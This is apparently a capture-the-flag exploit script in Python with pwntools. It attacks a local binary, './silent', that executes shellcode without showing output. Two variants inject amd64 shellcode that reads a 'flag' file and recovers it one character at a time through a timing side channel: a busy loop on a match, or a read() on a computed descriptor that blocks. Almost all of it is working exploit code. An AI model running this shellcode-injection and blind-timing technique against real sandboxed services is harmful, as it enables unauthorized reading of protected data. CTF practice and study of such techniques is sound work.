import time
from pwn import *

context(arch = 'amd64', os = 'linux')
sd = lambda data : sh.sendline(data)

ans = ''
for i in range(16,17):   # range(0,8) range(8,16) range(16,17)
    for ch in range(32, 127):
        sh = process('./silent')
        sh.recvuntil('Welcome to silent execution-box.\n')
        # 如果没有收取'\n'，那么下面就需要再次recv来收取垃圾数据
        shellcode = shellcraft.amd64.pushstr("flag")
        shellcode += shellcraft.amd64.linux.open('rsp',0,0)
        shellcode += shellcraft.amd64.linux.read('rax', 'rsp', 17)
        # 进行逐个字节的比较
        shellcode += '''
        loop:
        cmp byte ptr[rsp+{0}], {1}
        je loop
        '''.format(i, ch)
        payload = asm(shellcode)
        # gdb.attach(sh)
        sd(payload)
        # pause()
        
        start = time.time()
        try:
            # sh.recv()        # 收取垃圾数据
            sh.recv(timeout = 2)
        except:
            pass
        end = time.time()
        
        if end - start > 1.5:
            ans = ans + chr(ch)
            success("\033[0;32mflag:{0}\033[0m".format(ans))
            sh.close()
            sleep(3)
            break


# 2
from pwn import *
# context.log_level = "debug"
context.arch = 'amd64'

def dynamite_xor(io,idx,char):
    shellcode = shellcraft.amd64.pushstr("flag")
    shellcode += shellcraft.amd64.linux.open('rsp',0,0)
    shellcode += shellcraft.amd64.linux.read('rax','rsp',idx+1)
    shellcode += "mov al,[rsp+{0}];xor rax,{1};".format(str(idx),str(char))
    shellcode += shellcraft.amd64.linux.read('rax','rsp',1)
    payload = asm(shellcode)
    io.recvuntil('Welcome to silent execution-box.')
    info("\033[0;34mmov al,[rsp+{0}]; xor rax, {1};\033[0m".format(str(idx),chr(char)))
    io.sendline(payload)

def dynamite_sub(io,idx,char):
    shellcode = shellcraft.amd64.pushstr("flag")
    shellcode += shellcraft.amd64.linux.open('rsp',0,0)
    shellcode += shellcraft.amd64.linux.read('rax','rsp',idx+1)
    shellcode += "mov al,[rsp+{0}];sub rax,{1};".format(str(idx),str(char))
    shellcode += shellcraft.amd64.linux.read('rax','rsp',1)
    payload = asm(shellcode)
    io.recvuntil('Welcome to silent execution-box.')
    info("\033[0;34mmov al,[rsp+{0}];sub rax,{1};\033[0m".format(str(idx),chr(char)))
    io.sendline(payload)

def dynamite_add(io,idx,char):
    shellcode = shellcraft.amd64.pushstr("flag")
    shellcode += shellcraft.amd64.linux.open('rsp',0,0)
    shellcode += shellcraft.amd64.linux.read('rax','rsp',idx+1)
    shellcode += "mov al,[rsp+{0}];sub rax,{1};add rax, 2".format(str(idx),str(char))
    shellcode += shellcraft.amd64.linux.read('rax','rsp',1)
    payload = asm(shellcode)
    io.recvuntil('Welcome to silent execution-box.')
    info("\033[0;33mmov al,[rsp+{0}];sub rax,{1};add rax, 2;\033[0m".format(str(idx),chr(char)))
    io.sendline(payload)

def check_time(io):
    start_time = time.time()
    try:
        io.recv()
        io.recv(timeout=2)
    except:
        pass
    if time.time() - start_time >= 1.5:
        return True
    else:
        return False

def check(io,idx,char):
    dynamite_sub(io,idx,char)      
    if check_time(io):
      io1 = process('./silent')
      dynamite_add(io1,idx,char)
      if check_time(io1):
        io1.close()
        return True
    return False

def main():
    flag = ""
    for idx in range(18):
      for char in range(32,127):
        io = process('./silent')
        if check(io,idx,char):
          flag += chr(char)
          success("\033[0;32mflag[{0}]:{1}\033[0m".format(str(idx),chr(char)))
          success("\033[0;32mflag:{0}\033[0m".format(flag))
          break
        io.close()
    print(flag)

main()